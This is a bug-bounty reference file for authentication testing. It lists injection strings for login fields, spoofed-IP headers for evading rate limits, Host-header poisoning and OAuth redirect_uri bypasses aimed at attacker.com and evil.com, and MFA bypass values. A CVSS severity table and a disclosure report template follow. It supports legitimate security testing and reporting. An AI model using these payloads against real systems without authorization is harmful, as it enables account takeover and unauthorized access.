# Payloads, Severity Reference, and Report Template

## Parameter manipulation payloads

```
Empty password:        password=
Null password:          {"password": null}
Missing password:       (omit the field entirely)
Duplicate parameters:   username=admin&username=victim
                         {"password": ["wrong", "correct"]}
Long strings:            password=<300+ character string>
Unicode/case variations: ADMIN, Admin, аdmin (Cyrillic 'а'), admin\u0000
```

## NoSQL / SQL injection in auth fields

```
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}
username: admin' OR '1'='1
username: admin'--
```

## Rate-limit / lockout bypass headers

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```
Increment the IP per request (`127.0.0.1`, `127.0.0.2`, ...) rather than reusing one value.

## Password-reset Host-header poisoning headers

```
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
Forwarded: host=attacker.com
```

## 2FA/MFA bypass payloads

```
{"success": true, "verified": true}     # response manipulation target
000000                                   # placeholder/trivial OTP
123456
(empty)                                  # null/empty code submission
```

## OAuth redirect_uri bypass payloads

```
https://trusted.com.evil.com
https://trusted.com@evil.com
https://evil.com#@trusted.com/
https://trusted.com#evil.com
https://trusted.com?next=https://evil.com
https://localhost.evil.com
https://127.0.0.1.evil.com
https://trusted.com/callback/../../redirect
```

## OAuth duplicate redirect_uri (server-side parameter pollution)

```
redirect_uri=https://trusted.com/callback&redirect_uri=https://evil.com
```

## OAuth scope manipulation

```
openid profile
openid profile email
openid profile email admin
openid profile email *
```

## OAuth response_type variations to test

```
response_type=code
response_type=token
response_type=id_token
response_type=id_token token
response_type=code id_token
```

---

## CVSS 3.1 quick reference for common authentication findings

| Finding | Typical CVSS range | Severity |
|---|---|---|
| Username enumeration alone (no follow-on compromise) | ~3.1–5.3 | Low–Informational |
| Username enumeration + completed brute-force ATO | ~8.1–9.8 | Critical |
| No rate limit, with completed brute-force/credential-stuffing success | ~7.5–9.1 | High–Critical |
| Session fixation, demonstrated end-to-end | ~7.5–8.8 | High |
| Session not invalidated after logout, demonstrated replay | ~6.5–7.5 | Medium–High |
| MFA bypass via response/status manipulation, login completed | ~8.6–9.8 | Critical |
| MFA bypass via race condition | ~7.5–8.8 | High |
| Password reset poisoning, demonstrated end-to-end | ~8.1–9.1 | High–Critical |
| OAuth account-linking takeover (unverified email) | ~8.6–9.8 | Critical |
| OAuth missing `state`, with completed CSRF account-linking | ~7.5–8.8 | High |
| OAuth open-redirect-chained code/token theft, demonstrated | ~8.6–9.8 | Critical |
| `redirect_uri` bypass with captured code/token, demonstrated | ~8.1–9.1 | High–Critical |
| PKCE missing/downgradable, with demonstrated code interception | ~7.5–8.8 | High |
| OAuth scope escalation, confirmed broader access granted | ~6.5–8.1 | Medium–High |
| Logic-flaw full authentication bypass (no valid credential needed) | ~9.1–9.8 | Critical |

## Full report template

```markdown
**Title**: [Mechanism] in [exact flow] allows [actor] to [impact]

## Summary
2-3 plain sentences: what the bug is, where it lives, what it lets an
attacker do. No preamble.

## Steps to Reproduce
1. [Setup — e.g. "Create/use test account A as the victim stand-in"]
2. Send: [exact request — method, path, headers, body]
3. Observe: [exact response/behavior demonstrating the issue]
4. [Completion step] — log in / access the account / replay the
   session — and show it actually succeeds

## Proof of Concept
Request/response pair, or short screen recording showing the
authenticated session/account access actually obtained.

## Impact
An attacker can [exact action — e.g. "take over any account given only
its email address, with no prior credential"], resulting in [concrete
harm]. State plainly whether this requires the attacker to already know
something about the victim (their email is enough vs. needing existing
account access) — that distinction drives severity.

## Suggested Fix
One or two sentences specific to this flow.

## Severity Assessment
CVSS 3.1: X.X ([Severity label])
Attack Vector: Network | Privileges Required: [None/Low] |
User Interaction: [None/Required] | Scope: [C/I/A impact demonstrated]
```

### Tone and chaining notes

- Lead with the impact, not "I am writing to disclose..."
- If the finding required chaining two weak signals (e.g., enumeration + brute force), say so plainly in the summary — it's more convincing than presenting the final state alone, since it shows you understand why each half matters.
- State explicitly whether you tested against your own account or a stand-in second account — triagers will ask if you don't.
- Don't claim "any user" impact unless you've actually verified the flaw isn't specific to your test account's configuration (e.g., a feature flag, an account tier) — reproduce against at least one independent account where possible.
- Keep it under ~600 words; see the `api-security` skill's `payloads.md` for the same severity-pushback guidance, which applies here unchanged.
